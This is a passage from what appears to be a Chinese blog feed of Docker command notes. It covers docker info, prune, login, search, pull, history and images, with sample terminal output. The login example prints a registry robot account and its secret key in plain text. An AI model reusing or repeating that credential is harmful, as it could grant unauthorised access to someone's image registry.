class="hljs-string">&quot;localhost,127.0.0.1&quot;</span><br>   <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>重启docker </p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">systemctl restart docker</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>yunweiapplications</category>
      
      <category>docker</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tips</tag>
      
      <tag>yunwei</tag>
      
      <tag>yunweiapplications</tag>
      
      <tag>docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>docker_command</title>
    <link href="/2024/02/20/yunwei/applications/docker/docker_command/"/>
    <url>/2024/02/20/yunwei/applications/docker/docker_command/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><p>命令基于 mac Docker Desktop 4.11.1 (84025) </p><h1 id="docker服务"><a href="#docker服务" class="headerlink" title="docker服务"></a>docker服务</h1><h2 id="查看服务"><a href="#查看服务" class="headerlink" title="查看服务"></a>查看服务</h2><h3 id="docker-info"><a href="#docker-info" class="headerlink" title="docker info"></a>docker info</h3><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs nix">➜  test docker info<br><span class="hljs-params">Client:</span><br> <span class="hljs-params">Context:</span>    default<br> Debug <span class="hljs-params">Mode:</span> <span class="hljs-literal">false</span><br> <span class="hljs-params">Plugins:</span><br>  <span class="hljs-params">buildx:</span> Docker Buildx (Docker Inc., v0.<span class="hljs-number">8.2</span>)<br>  <span class="hljs-params">compose:</span> Docker Compose (Docker Inc., v2.<span class="hljs-number">7.0</span>)<br>  <span class="hljs-params">extension:</span> Manages Docker extensions (Docker Inc., v0.<span class="hljs-number">2.8</span>)<br>  <span class="hljs-params">sbom:</span> View the packaged-based Software Bill Of Materials (SBOM) for an image (Anchore Inc., <span class="hljs-number">0.6</span>.<span class="hljs-number">0</span>)<br>  <span class="hljs-params">scan:</span> Docker Scan (Docker Inc., v0.<span class="hljs-number">17.0</span>)<br><br><span class="hljs-params">Server:</span><br> <span class="hljs-params">Containers:</span> <span class="hljs-number">10</span><br>  <span class="hljs-params">Running:</span> <span class="hljs-number">2</span><br>  <span class="hljs-params">Paused:</span> <span class="hljs-number">0</span><br>  <span class="hljs-params">Stopped:</span> <span class="hljs-number">8</span><br> <span class="hljs-params">Images:</span> <span class="hljs-number">14</span><br> Server <span class="hljs-params">Version:</span> <span class="hljs-number">20.10</span>.<span class="hljs-number">17</span><br> Storage <span class="hljs-params">Driver:</span> overlay2<br>  Backing <span class="hljs-params">Filesystem:</span> extfs<br>  Supports <span class="hljs-params">d_type:</span> <span class="hljs-literal">true</span><br>  Native Overlay <span class="hljs-params">Diff:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-params">userxattr:</span> <span class="hljs-literal">false</span><br> Logging <span class="hljs-params">Driver:</span> json-file<br> Cgroup <span class="hljs-params">Driver:</span> cgroupfs<br> Cgroup <span class="hljs-params">Version:</span> <span class="hljs-number">2</span><br> <span class="hljs-params">Plugins:</span><br>  <span class="hljs-params">Volume:</span> local<br>  <span class="hljs-params">Network:</span> bridge host ipvlan macvlan <span class="hljs-literal">null</span> overlay<br>  <span class="hljs-params">Log:</span> awslogs fluentd gcplogs gelf journald json-file local logentries splunk syslog<br> <span class="hljs-params">Swarm:</span> inactive<br> <span class="hljs-params">Runtimes:</span> runc io.containerd.runc.v2 io.containerd.runtime.v1.linux<br> Default <span class="hljs-params">Runtime:</span> runc<br> Init <span class="hljs-params">Binary:</span> docker-init<br> containerd <span class="hljs-params">version:</span> <span class="hljs-number">10</span>c12954828e7c7c9b6e0ea9b0c02b01407d3ae1<br> runc <span class="hljs-params">version:</span> v1.<span class="hljs-number">1</span>.<span class="hljs-number">2</span><span class="hljs-operator">-</span><span class="hljs-number">0</span><span class="hljs-operator">-</span>ga916309<br> init <span class="hljs-params">version:</span> de40ad0<br> Security <span class="hljs-params">Options:</span><br>  seccomp<br>   <span class="hljs-params">Profile:</span> default<br>  cgroupns<br> Kernel <span class="hljs-params">Version:</span> <span class="hljs-number">5.10</span>.<span class="hljs-number">10</span>4-linuxkit<br> Operating <span class="hljs-params">System:</span> Docker Desktop<br> <span class="hljs-params">OSType:</span> linux<br> <span class="hljs-params">Architecture:</span> aarch64<br> <span class="hljs-params">CPUs:</span> <span class="hljs-number">4</span><br> Total <span class="hljs-params">Memory:</span> <span class="hljs-number">3.841</span>GiB<br> <span class="hljs-params">Name:</span> docker-desktop<br> <span class="hljs-params">ID:</span> <span class="hljs-number">4</span>PPK:ZEQN:<span class="hljs-number">27</span>ZX:<span class="hljs-number">7</span>RDL:BASL:RHIO:UZXN:DTSX:UHWP:HBFU:<span class="hljs-number">2</span>DYI:EJRN<br> Docker Root <span class="hljs-params">Dir:</span> <span class="hljs-symbol">/var/lib/docker</span><br> Debug <span class="hljs-params">Mode:</span> <span class="hljs-literal">false</span><br> HTTP <span class="hljs-params">Proxy:</span> http.docker.internal:<span class="hljs-number">3128</span><br> HTTPS <span class="hljs-params">Proxy:</span> http.docker.internal:<span class="hljs-number">3128</span><br> No <span class="hljs-params">Proxy:</span> hubproxy.docker.internal<br> <span class="hljs-params">Registry:</span> https:<span class="hljs-operator">//</span>index.docker.io<span class="hljs-operator">/</span>v1<span class="hljs-symbol">/</span><br> <span class="hljs-params">Labels:</span><br> <span class="hljs-params">Experimental:</span> <span class="hljs-literal">false</span><br> Insecure <span class="hljs-params">Registries:</span><br>  hubproxy.docker.internal:<span class="hljs-number">5000</span><br>  <span class="hljs-number">127.0</span>.<span class="hljs-number">0.0</span><span class="hljs-symbol">/8</span><br> Registry <span class="hljs-params">Mirrors:</span><br>  https:<span class="hljs-operator">//</span>zp98nloz.mirror.aliyuncs.com<span class="hljs-symbol">/</span><br> Live Restore <span class="hljs-params">Enabled:</span> <span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><h2 id="清除缓存"><a href="#清除缓存" class="headerlink" title="清除缓存"></a>清除缓存</h2><p>docker system prune -a</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs livescript">[root@nvm- db]<span class="hljs-comment"># docker ps</span><br>CONTAINER ID        IMAGE                         COMMAND                  CREATED             STATUS              PORTS                    NAMES<br><span class="hljs-number">84457a</span>2d6565        xuxueli/xxl-job-admin:<span class="hljs-number">2.3</span>.<span class="hljs-number">1</span>   <span class="hljs-string">&quot;sh -c &#x27;java -jar ...&quot;</span>   <span class="hljs-number">25</span> minutes ago      Up <span class="hljs-number">25</span> minutes       <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">8080</span>-&gt;<span class="hljs-number">8080</span>/tcp   xxl-job-admin<br>[root@nvm- db]<span class="hljs-comment"># docker images</span><br>REPOSITORY                        TAG                 IMAGE ID            CREATED             SIZE<br>docker.io/xuxueli/xxl-job-admin   <span class="hljs-number">2.3</span>.<span class="hljs-number">1</span>               <span class="hljs-number">252b</span>168021da        <span class="hljs-number">2</span> years ago         <span class="hljs-number">237</span> MB<br>[root@nvm- db]<span class="hljs-comment">#</span><br>[root@nvm- db]<span class="hljs-comment">#</span><br>[root@nvm- db]<span class="hljs-comment">#</span><br>[root@nvm- db]<span class="hljs-comment"># docker system prune -a</span><br>WARNING! This will remove:<br>- all stopped containers<br>- all volumes <span class="hljs-keyword">not</span> used <span class="hljs-keyword">by</span> at least one container<br>- all networks <span class="hljs-keyword">not</span> used <span class="hljs-keyword">by</span> at least one container<br>- all images without at least one container associated <span class="hljs-keyword">to</span> them<br>Are you sure you want <span class="hljs-keyword">to</span> <span class="hljs-keyword">continue</span>? [y/N] y<br>Deleted Networks:<br>unacc_default<br><br>Total reclaimed space: <span class="hljs-number">0</span> B<br>[root@nvm- db]<span class="hljs-comment">#</span><br>[root@nvm- db]<span class="hljs-comment">#</span><br>[root@nvm- db]<span class="hljs-comment"># docker images</span><br>REPOSITORY                        TAG                 IMAGE ID            CREATED             SIZE<br>docker.io/xuxueli/xxl-job-admin   <span class="hljs-number">2.3</span>.<span class="hljs-number">1</span>               <span class="hljs-number">252b</span>168021da        <span class="hljs-number">2</span> years ago         <span class="hljs-number">237</span> MB<br>[root@nvm- db]<span class="hljs-comment"># docker ps</span><br>CONTAINER ID        IMAGE                         COMMAND                  CREATED             STATUS              PORTS                    NAMES<br><span class="hljs-number">84457a</span>2d6565        xuxueli/xxl-job-admin:<span class="hljs-number">2.3</span>.<span class="hljs-number">1</span>   <span class="hljs-string">&quot;sh -c &#x27;java -jar ...&quot;</span>   <span class="hljs-number">26</span> minutes ago      Up <span class="hljs-number">26</span> minutes       <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">8080</span>-&gt;<span class="hljs-number">8080</span>/tcp   xxl-job-admin<br></code></pre></td></tr></table></figure><h1 id="镜像仓库"><a href="#镜像仓库" class="headerlink" title="镜像仓库"></a>镜像仓库</h1><h2 id="登录镜像仓库"><a href="#登录镜像仓库" class="headerlink" title="登录镜像仓库"></a>登录镜像仓库</h2><h3 id="docker-login"><a href="#docker-login" class="headerlink" title="docker login"></a>docker login</h3><p><strong>docker login [OPTIONS] [SERVER] [flags]</strong></p><h4 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h4><p>以用户名&#x2F;密码或机器人账户&#x2F;密钥方式登录指定镜像仓库</p><h4 id="SERVER"><a href="#SERVER" class="headerlink" title="SERVER"></a>SERVER</h4><p>指定镜像仓库地址，例如：hub.xxx.com</p><h4 id="Flags"><a href="#Flags" class="headerlink" title="Flags"></a>Flags</h4><h5 id="p"><a href="#p" class="headerlink" title="-p"></a>-p</h5><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-comment">--password string </span><br></code></pre></td></tr></table></figure><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-comment">--password-stdin</span><br></code></pre></td></tr></table></figure><h5 id="u"><a href="#u" class="headerlink" title="-u"></a>-u</h5><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-comment">--username string</span><br></code></pre></td></tr></table></figure><h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><p>机器人账户：robot-0207</p><p>机器人密钥：wlRCBQX68DCZIrCHoSAvACm1xpdadTBF</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">➜  test docker <span class="hljs-keyword">login</span> registry.xxx.xxx.com -u robot<span class="hljs-number">-0227</span> -p wlRCBQX68DCZIrCHoSAvACm1xpdadTBF<br><span class="hljs-built_in">WARNING</span>! <span class="hljs-keyword">Using</span> <span class="hljs-comment">--password via the CLI is insecure. Use --password-stdin.</span><br><span class="hljs-keyword">Login</span> Succeeded<br></code></pre></td></tr></table></figure><h2 id="退出镜仓库"><a href="#退出镜仓库" class="headerlink" title="退出镜仓库"></a>退出镜仓库</h2><h3 id="docker-logout"><a href="#docker-logout" class="headerlink" title="docker logout"></a>docker logout</h3><p><strong>docker logout [SERVER] [flags]</strong></p><h4 id="描述-1"><a href="#描述-1" class="headerlink" title="描述"></a>描述</h4><p>退出指定镜像仓库</p><h4 id="SERVER-1"><a href="#SERVER-1" class="headerlink" title="SERVER"></a>SERVER</h4><p>指定镜像仓库地址，例如：hub.xxx.com</p><h4 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h4><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">➜  <span class="hljs-symbol">~ docker logout</span><br><span class="hljs-symbol">Removing login credentials for https</span>:<span class="hljs-comment">//index.docker.io/v1/</span><br></code></pre></td></tr></table></figure><h1 id="镜像"><a href="#镜像" class="headerlink" title="镜像"></a>镜像</h1><h2 id="查询镜像"><a href="#查询镜像" class="headerlink" title="查询镜像"></a>查询镜像</h2><h3 id="docker-search"><a href="#docker-search" class="headerlink" title="docker search"></a>docker search</h3><p><strong>docker search [OPTIONS] TEAM</strong></p><h4 id="描述-2"><a href="#描述-2" class="headerlink" title="描述"></a>描述</h4><p>默认官方 Docker Hub （hub.docker.com）查找镜像</p><h4 id="OPTIONS"><a href="#OPTIONS" class="headerlink" title="OPTIONS"></a>OPTIONS</h4><h5 id="f-–filter-filter"><a href="#f-–filter-filter" class="headerlink" title="-f –filter filter"></a>-f –filter filter</h5><p>Filter output based on conditions provided 根据过滤条件过滤镜像</p><h5 id="–no-trunc"><a href="#–no-trunc" class="headerlink" title="–no-trunc"></a>–no-trunc</h5><p>Don’t truncate output 不截断输出，也就是显示完整的镜像描述</p><h5 id="–limit-ini"><a href="#–limit-ini" class="headerlink" title="–limit ini"></a>–limit ini</h5><p>Max number of search results (default 25) 搜索结果的最大数目(默认25个)</p><h5 id="–format-string"><a href="#–format-string" class="headerlink" title="–format string"></a>–format string</h5><p>Pretty-print search using a Go template</p><h4 id="TEAM"><a href="#TEAM" class="headerlink" title="TEAM"></a>TEAM</h4><p>指定需要查询的镜像名</p><h4 id="实例-2"><a href="#实例-2" class="headerlink" title="实例"></a>实例</h4><h5 id="查找镜像名包含memcached且收藏数大于10的镜像"><a href="#查找镜像名包含memcached且收藏数大于10的镜像" class="headerlink" title="查找镜像名包含memcached且收藏数大于10的镜像"></a>查找镜像名包含memcached且收藏数大于10的镜像</h5><p>docker search -f stars&#x3D;10 memcached –no-trunc</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">➜  /tmp docker <span class="hljs-keyword">search</span> -f stars=<span class="hljs-number">10</span> memcached <span class="hljs-comment">--no-trunc</span><br><span class="hljs-type">NAME</span>                       DESCRIPTION                                                                       STARS     OFFICIAL   AUTOMATED<br>memcached                  Free &amp; <span class="hljs-keyword">open</span> source, high-performance, distributed memory <span class="hljs-keyword">object</span> caching <span class="hljs-keyword">system</span>.   <span class="hljs-number">2135</span>      [OK]       <br>bitnami/memcached          Bitnami Memcached Docker Image                                                    <span class="hljs-number">32</span>                   [OK]<br>sylvainlasnier/memcached   Memcached docker images based <span class="hljs-keyword">on</span> Ubuntu <span class="hljs-number">14.10</span>. It <span class="hljs-keyword">is</span> small <span class="hljs-keyword">and</span> basic.             <span class="hljs-number">28</span>                   [OK]<br>rapidfort/memcached-ib     RapidFort optimized, hardened image <span class="hljs-keyword">for</span> Memcached IronBank                        <span class="hljs-number">12</span>                   <br>rapidfort/memcached        RapidFort optimized, hardened image <span class="hljs-keyword">for</span> Memcached                                 <span class="hljs-number">11</span>                   <br>prom/memcached-exporter    Exports metrics <span class="hljs-keyword">from</span> memcached servers <span class="hljs-keyword">for</span> consumption <span class="hljs-keyword">by</span> Prometheus.             <span class="hljs-number">10</span>               <br></code></pre></td></tr></table></figure><p>NAME：镜像名</p><p>DESCRIPTION：描述</p><p>START：关注数</p><p>OFFICIAL：是否为docker官方发布</p><p>AUTOMATED：自动构建</p><h2 id="下载镜像"><a href="#下载镜像" class="headerlink" title="下载镜像"></a>下载镜像</h2><h3 id="docker-pull"><a href="#docker-pull" class="headerlink" title="docker pull"></a>docker pull</h3><p><strong>docker pull [OPTIONS] NAME[:TAG|@DIGEST]</strong></p><h4 id="描述-3"><a href="#描述-3" class="headerlink" title="描述"></a>描述</h4><p>从镜像仓库中拉取或者更新指定镜像，如不选定版本号，则下载最新镜像</p><h4 id="OPTIONS-1"><a href="#OPTIONS-1" class="headerlink" title="OPTIONS"></a>OPTIONS</h4><h5 id="a-–all-tags"><a href="#a-–all-tags" class="headerlink" title="-a –all-tags"></a>-a –all-tags</h5><p>拉取所有tagged镜像</p><h5 id="–distable-content-trust"><a href="#–distable-content-trust" class="headerlink" title="–distable-content-trust"></a>–distable-content-trust</h5><p>忽略镜像的校验，默认是开启校验的</p><h4 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h4><p>1、pull命令中的NAME，取决于<a href="https://hub.docker.com/%E4%B8%AD%E6%98%BE%E7%A4%BA%E7%9A%84%E8%BD%AF%E4%BB%B6%E5%90%8D%E3%80%82">https://hub.docker.com/中显示的软件名。</a></p><p>例如：</p><p>下载 mysql 8.3.0 版本，使用 docker pull mysql:8.3.0</p><p>下载 grafana&#x2F;grafana 10.2.4 版本，使用 docker pull grafana&#x2F;grafana:10.2.4 </p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">[root@localhost grafana]<span class="hljs-comment"># docker pull grafana/grafana:6.3.3</span><br><span class="hljs-number">6.3</span><span class="hljs-number">.3</span>: Pulling <span class="hljs-keyword">from</span> grafana/grafana<br>[root@localhost grafana]<span class="hljs-comment"># docker pull grafana/grafana:8.2.6</span><br><span class="hljs-number">8.2</span><span class="hljs-number">.6</span>: Pulling <span class="hljs-keyword">from</span> grafana/grafana<br><br>[root@localhost grafana]<span class="hljs-comment"># docker images | grep grafana</span><br>grafana/grafana                                                   <span class="hljs-number">8.2</span><span class="hljs-number">.6</span>     aeeaa96eea83   <span class="hljs-number">5</span> months ago   <span class="hljs-number">253</span>MB<br>grafana/grafana                                                   <span class="hljs-number">6.3</span><span class="hljs-number">.3</span>     a6e14b4109af   <span class="hljs-number">2</span> years ago    <span class="hljs-number">253</span>MB<br></code></pre></td></tr></table></figure><h4 id="实例-3"><a href="#实例-3" class="headerlink" title="实例"></a>实例</h4><p>从 docker hub 下载最新版memcached</p><p>docker pull memcached</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs makefile">(base) root@localhost:~<span class="hljs-comment"># docker pull memcached:latest</span><br><span class="hljs-section">latest: Pulling from library/memcached</span><br><span class="hljs-section">c229119241af: Pull complete </span><br><span class="hljs-section">af2f0309d301: Pull complete </span><br><span class="hljs-section">35783664a727: Pull complete </span><br><span class="hljs-section">a0d63d088cef: Pull complete </span><br><span class="hljs-section">d2f1f521665d: Pull complete </span><br><span class="hljs-section">24f6b2ace768: Pull complete </span><br><span class="hljs-section">Digest: sha256:c42541495ec1a6925cb105635bcafeedf60a56e3b9e4ac8b1afaf6d7851d70b2</span><br><span class="hljs-section">Status: Downloaded newer image for memcached:latest</span><br><span class="hljs-section">docker.io/library/memcached:latest</span><br></code></pre></td></tr></table></figure><h2 id="查看镜像历史"><a href="#查看镜像历史" class="headerlink" title="查看镜像历史"></a>查看镜像历史</h2><h3 id="docker-history"><a href="#docker-history" class="headerlink" title="docker history"></a>docker history</h3><p><strong>docker history [OPTIONS] images</strong></p><h4 id="描述-4"><a href="#描述-4" class="headerlink" title="描述"></a>描述</h4><p>查看镜像的历史提交记录信息</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs leaf">➜  /tmp docker history mysql               <br>IMAGE          CREATED        CREATED BY                                      SIZE      COMMENT<br>de7c37d1d5ac   6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  CMD [&quot;mysqld&quot;]               0B        <br>&lt;missing&gt;      6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  EXPOSE 3306 33060            0B        <br>&lt;missing&gt;      6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  ENTRYPOINT [&quot;docker-entry…   0B        <br>&lt;missing&gt;      6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span> COPY file:e9c22353a1133b89…   14.2kB    <br>&lt;missing&gt;      6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  VOLUME [/var/lib/mysql]      0B        <br>&lt;missing&gt;      6 months ago   /bin/sh -c set -eux;  microdnf install -y &quot;m…   282MB     <br>&lt;missing&gt;      6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  ENV MYSQL_SHELL_VERSION=8…   0B        <br>&lt;missing&gt;      6 months ago   /bin/sh -c set -eu;  . /etc/os-release;  &#123;  …   215B      <br>&lt;missing&gt;      6 months ago   /bin/sh -c set -eux;  microdnf install -y &quot;m…   183MB     <br>&lt;missing&gt;      6 months ago   /bin/sh -c set -eu;  . /etc/os-release;  &#123;  …   246B      <br>&lt;missing&gt;      6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  ENV MYSQL_VERSION=8.1.0-1…   0B        <br>&lt;missing&gt;      6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  ENV MYSQL_MAJOR=innovation   0B        <br>&lt;missing&gt;      7 months ago   /bin/sh -c set -eux;  key=&#x27;859BE8D7C586F5384…   3.17kB    <br>&lt;missing&gt;      7 months ago   /bin/sh -c set -eux;  microdnf install -y   …   14.1MB    <br>&lt;missing&gt;      7 months ago   /bin/sh -c set -eux;  arch=&quot;$(uname -m)&quot;;  c…   2.4MB     <br>&lt;missing&gt;      7 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  ENV GOSU_VERSION=1.16        0B        <br>&lt;missing&gt;      7 months ago   /bin/sh -c set -eux;  groupadd --system --gi…   2.77kB    <br>&lt;missing&gt;      7 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  CMD [&quot;/bin/bash&quot;]            0B        <br>&lt;missing&gt;      7 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span> ADD file:49b1f7f2b2558f789…   118MB   <br></code></pre></td></tr></table></figure><h4 id="OPTIONS-2"><a href="#OPTIONS-2" class="headerlink" title="OPTIONS"></a>OPTIONS</h4><h5 id="H"><a href="#H" class="headerlink" title="-H"></a>-H</h5><p>以可读的方式展示时间镜像信息和时间，默认开启</p><h5 id="q"><a href="#q" class="headerlink" title="-q"></a>-q</h5><p>仅列出提交记录ID</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs nix">➜  <span class="hljs-symbol">/tmp</span> docker history <span class="hljs-operator">-</span>q mysql<br>de7c37d1d5ac<br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br></code></pre></td></tr></table></figure><h5 id="–no-trunc-1"><a href="#–no-trunc-1" class="headerlink" title="–no-trunc"></a>–no-trunc</h5><p>Don’t truncate output 不截断输出，也就是显示完整信息</p><h4 id="images"><a href="#images" class="headerlink" title="images"></a>images</h4><p>image ID 或REPOSITORY:TAG</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs tap">➜  /tmp docker images<br>REPOSITORY                TAG          IMAGE ID       CREATED         SIZE<br>grafana/grafana           10.2.4       147eb932c0fd  <span class="hljs-number"> 10 </span>days ago     391MB<br>mysql                     8.3.0        e68e2614955c  <span class="hljs-number"> 5 </span>weeks ago     638MB<br>apache/activemq-artemis   latest       76998b3399b7  <span class="hljs-number"> 3 </span>months ago    312MB<br>lamp_web                  latest       41d9dabcb737  <span class="hljs-number"> 6 </span>months ago    524MB<br>mysql                     latest       de7c37d1d5ac  <span class="hljs-number"> 6 </span>months ago    599MB<br>ubuntu                    latest       4c2c87c6c36e  <span class="hljs-number"> 14 </span>months ago   69.2MB<br>kalilinux/kali-rolling    latest       0d323592c7f5  <span class="hljs-number"> 14 </span>months ago   140MB<br>centos                   <span class="hljs-number"> 7 </span>           c9a1fdca3387  <span class="hljs-number"> 2 </span>years ago     301MB<br>nginx                     latest       eeb9db34b331  <span class="hljs-number"> 2 </span>years ago     134MB<br>php                       7.4.21-fpm   1829ff0bdd88  <span class="hljs-number"> 2 </span>years ago     364MB<br>vulhub/flink              1.11.2       b137254280cc  <span class="hljs-number"> 3 </span>years ago     625MB<br>islandora/activemq        latest       5d0bce1752d7  <span class="hljs-number"> 3 </span>years ago     272MB<br>webcenter/activemq        latest       3af156432993  <span class="hljs-number"> 7 </span>years ago     422MB<br></code></pre></td></tr></table></figure><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 